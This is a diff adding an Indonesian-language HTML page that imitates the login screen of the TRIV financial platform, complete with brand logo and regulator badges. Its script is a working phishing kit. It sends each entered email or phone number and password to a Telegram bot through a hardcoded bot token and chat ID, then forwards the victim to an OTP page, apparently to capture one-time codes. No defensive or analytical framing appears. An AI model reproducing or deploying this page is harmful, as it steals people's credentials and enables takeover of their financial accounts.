@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TRIV - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+        body {
+            min-height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+        /* ===== LAYAR PEMBUKA / SPLASH SCREEN ===== */
+        .splash-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background: linear-gradient(135deg, #051020 0%, #0a2040 50%, #051530 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 100;
+            transition: opacity 0.8s ease, transform 0.8s ease;
+        }
+        .wave {
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(ellipse at center, rgba(40,140,255,0.15) 0%, transparent 70%);
+            animation: waveMove 6s ease-in-out infinite alternate;
+        }
+        .wave:nth-child(2) {
+            animation-delay: -2s;
+            opacity: 0.5;
+        }
+        .wave:nth-child(3) {
+            animation-delay: -4s;
+            opacity: 0.3;
+        }
+        @keyframes waveMove {
+            0% { transform: translate(-10%, -10%) scale(1.1); }
+            100% { transform: translate(10%, 10%) scale(1.2); }
+        }
+        .logo-triv {
+            position: relative;
+            z-index: 10;
+            animation: logoFloat 3s ease-in-out infinite, logoGlow 4s ease-in-out infinite alternate;
+            margin-bottom: 60px;
+        }
+        .logo-text {
+            font-size: 4rem;
+            font-weight: 600;
+            color: #80D0FF;
+            letter-spacing: 2px;
+            text-shadow: 0 0 20px rgba(100,200,255,0.6), 0 0 40px rgba(50,150,255,0.4);
+        }
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        @keyframes logoGlow {
+            0% { filter: brightness(1); }
+            100% { filter: brightness(1.3); }
+        }
+        .footer-text {
+            position: absolute;
+            bottom: 50px;
+            text-align: center;
+            color: #B0D8FF;
+            font-size: 0.9rem;
+            z-index: 10;
+            animation: fadeIn 1.5s ease-out 0.5s both;
+        }
+        .badges {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin: 15px 0;
+            flex-wrap: wrap;
+        }
+        .badge {
+            background: rgba(255,255,255,0.1);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            color: #D0E8FF;
+            border: 1px solid rgba(255,255,255,0.15);
+        }
+        .copyright {
+            font-size: 0.75rem;
+            color: #70A8D8;
+            margin-top: 10px;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .splash-hidden {
+            opacity: 0;
+            pointer-events: none;
+            transform: scale(1.05);
+        }
+        /* ===== HALAMAN LOGIN ===== */
+        .login-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background: linear-gradient(135deg, #051530 0%, #0a2550 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 60px 30px;
+            opacity: 0;
+            transform: translateY(30px);
+            transition: opacity 0.8s ease 0.3s, transform 0.8s ease 0.3s;
+            overflow-y: auto;
+        }
+        .login-visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .login-logo {
+            font-size: 2.5rem;
+            font-weight: 600;
+            color: #80D0FF;
+            margin: 30px 0 40px;
+            text-shadow: 0 0 15px rgba(100,200,255,0.5);
+        }
+        .form-container {
+            width: 100%;
+            max-width: 360px;
+        }
+        .form-title {
+            color: #E0F0FF;
+            font-size: 1.3rem;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: block;
+            color: #B0D8FF;
+            font-size: 0.85rem;
+            margin-bottom: 8px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 14px 18px;
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(150,200,255,0.2);
+            border-radius: 12px;
+            color: #FFFFFF;
+            font-size: 1rem;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+        .input-field:focus {
+            border-color: #40A0FF;
+            box-shadow: 0 0 0 3px rgba(64,160,255,0.2);
+            background: rgba(255,255,255,0.1);
+        }
+        .btn-login {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(90deg, #2080FF, #40B0FF);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+        .btn-login:active {
+            transform: scale(0.97);
+        }
+        .btn-login:hover {
+            box-shadow: 0 5px 25px rgba(32,128,255,0.4);
+        }
+        .link-group {
+            margin-top: 25px;
+            text-align: center;
+        }
+        .link {
+            color: #70C0FF;
+            font-size: 0.85rem;
+            text-decoration: none;
+            display: inline-block;
+            margin: 5px 10px;
+        }
+        .link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- LAYAR PEMBUKA ANIMASI -->
+    <div class="splash-screen" id="splashScreen">
+        <div class="wave"></div>
+        <div class="wave"></div>
+        <div class="wave"></div>
+        <div class="logo-triv">
+            <div class="logo-text">triv</div>
+        </div>
+        <div class="footer-text">
+            <p>TRIV berizin dan diawasi oleh Otoritas Jasa Keuangan</p>
+            <div class="badges">
+                <span class="badge">BAPPEBTI</span>
+                <span class="badge">CISA</span>
+            </div>
+            <p class="copyright">© Copyright Triv Group 2026</p>
+        </div>
+    </div>
+
+    <!-- HALAMAN LOGIN -->
+    <div class="login-screen" id="loginScreen">
+        <div class="login-logo">triv</div>
+        <div class="form-container">
+            <h2 class="form-title">Masuk ke Akun Anda</h2>
+            <div class="input-group">
+                <label>Email / Nomor HP</label>
+                <input type="text" class="input-field" id="userInput" placeholder="Masukkan email atau nomor HP">
+            </div>
+            <div class="input-group">
+                <label>Kata Sandi</label>
+                <input type="password" class="input-field" id="passInput" placeholder="Masukkan kata sandi">
+            </div>
+            <button class="btn-login" id="btnMasuk">Masuk</button>
+            <div class="link-group">
+                <a href="#" class="link">Lupa Kata Sandi?</a>
+                <a href="#" class="link">Belum Punya Akun? Daftar</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ==================== PENGATURAN ====================
+        const BOT_TOKEN = '8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg';
+        const CHAT_ID = '8592742129';
+        // ✅ NAMA FILE KONSISTEN: huruf kecil semua
+        const HALAMAN_TUJUAN = 'otp.html';
+        // =====================================================
+
+        // Pindah ke halaman login setelah 3 detik
+        setTimeout(() => {
+            splashScreen.classList.add('splash-hidden');
+            setTimeout(() => loginScreen.classList.add('login-visible'), 300);
+        }, 3000);
+
+        // Kirim ke Telegram
+        async function kirimKeTelegram(pesan) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pesan,
+                        disable_web_page_preview: true
+                    })
+                });
+            } catch (err) {
+                console.log('⚠️ Gagal kirim:', err);
+            }
+        }
+
+        // Tombol Masuk → Kirim → Pindah ke OTP
+        btnMasuk.addEventListener('click', async () => {
+            const user = userInput.value.trim();
+            const sandi = passInput.value;
+
+            if (!user || !sandi) {
+                alert('Harap isi semua kolom!');
+                return;
+            }
+
+            // Kirim data ke Telegram
+            await kirimKeTelegram(`🔐 LOGIN TRIV
+📧 Email/HP: ${user}
+🔑 Kata Sandi: ${sandi}
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}`);
+
+            // ✅ DIPERKUAT: 2 cara pindah + jeda agar pasti berfungsi
+            setTimeout(() => {
+                window.location.href = HALAMAN_TUJUAN;
+                window.location.replace(HALAMAN_TUJUAN);
+            }, 300);
+        });
+    </script>
+
+</body>
+</html>
